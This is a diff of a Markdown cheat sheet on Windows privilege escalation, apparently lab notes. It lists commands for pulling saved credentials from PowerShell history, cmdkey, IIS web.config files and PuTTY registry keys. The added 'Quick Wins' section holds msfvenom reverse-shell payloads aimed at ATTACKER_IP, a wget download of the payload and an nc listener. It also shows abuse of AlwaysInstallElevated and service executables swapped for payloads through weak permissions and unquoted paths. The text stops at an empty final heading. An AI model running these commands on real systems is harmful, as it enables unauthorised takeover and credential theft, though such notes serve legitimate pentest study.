@@ -234,7 +234,7 @@ C:\Windows\system32\sysprep\sysprep.xml
 </Credentials>
 ```
 
-## Powershell History
+### Powershell History
 
 command: 
 ```cmd
@@ -244,7 +244,7 @@ type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\Conso
 type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
 
-## Saved Windows Credentials
+### Saved Windows Credentials
 
 ```cmd
 cmdkey /list
@@ -252,18 +252,78 @@ cmdkey /list
 runas /savecred /user:admin cmd.exe
 ```
 
-## IIS Configuration
+### IIS Configuration
 ```shell
 C:\inetpub\wwwroot\web.config
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
 
 type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString #a quick way to find database connection strings
 ```
-## Retrieve Credentials from Software: PuTTY 
+### Retrieve Credentials from Software: PuTTY 
 ```shell
 reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 ```
 
->note: Other software have methods to recover any passwords the user has saved   
+>note: Other software have methods to recover any passwords the user has saved  
 
+##  Other Quick Wins 
+### Scheduled Tasks  
+
+command: [explain](https://chat.openai.com/share/099635af-3639-4c36-bead-1015aa2439c3)
+```bash
+schtasks 
+schtasks /query /tn vulntask /fo list /v 
+
+icacls c:\tasks\schtask.bat #check the file permissions on the executable 
+
+ schtasks /run /tn vulntask #manually run task, experimental purpose
+```
+### AlwaysInstallElevated 
+command: 
+```bash
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer  #query 1
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer #query 2
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.109.20 LPORT=LOCAL_PORT -f msi -o malicious.msi
+
+ msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+```
+###  Abusing Service Misconfigurations
+#### Windows Services
+command:  
+```bash
+sc qc apphostsvc
+
+```
+#### Insecure Permissions on Service Executable
+
+command: 
+```cmd
+sc qc WindowsScheduler 
+icacls C:\PROGRA~2\SYSTEM~1\WService.exe 
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
+python3 -m http.server 80
+wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
+
+cd C:\PROGRA~2\SYSTEM~1\
+move WService.exe WService.exe.bkp
+move C:\Users\thm-unpriv\rev-svc.exe WService.exe
+icacls WService.exe /grant Everyone:F
+nc -lvp 4445
+sc stop windowsscheduler
+sc start windowsscheduler
+note: PowerShell sc.exe
+```
+#### Unquoted Service Paths 
+command: 
+```cmd
+sc qc "disk sorter enterprise"  
+icacls c:\MyPrograms 
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe 
+move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
+icacls C:\MyPrograms\Disk.exe /grant Everyone:F  
+sc stop "disk sorter enterprise"
+sc start "disk sorter enterprise"
+```
+#### Insecure Service Permissions 
 
